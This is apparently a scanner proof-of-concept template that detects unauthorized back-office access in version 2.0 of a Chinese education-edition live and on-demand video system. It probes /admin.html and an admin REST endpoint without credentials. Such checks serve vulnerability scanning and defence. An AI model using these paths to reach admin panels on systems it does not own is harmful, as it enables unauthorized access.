id: poc-yaml-bjsin-ams-admin-unauthorized-access
info:
  name: 直播点播系统普教版V2.0 后台未授权访问漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: 直播点播系统普教版
  fofa: null
requests:
- method: GET
  path: /admin.html
  expression: "status_code == 200 && \ncontains(body,\"直播点播系统普教版\") &&\ncontains(body,\"\
    后台首页\") &&\ncontains(body,\"admin\") &&\ncontains(body,\"网站前台跳转\") &&\ncontains(body,\"\
    后台管理\")\n"
- method: GET
  path: /rest/admin/system/serverStartTime
  expression: 'status_code == 200 &&

    contains(body,"\"time\"")

    '
variables: {}
transport: http
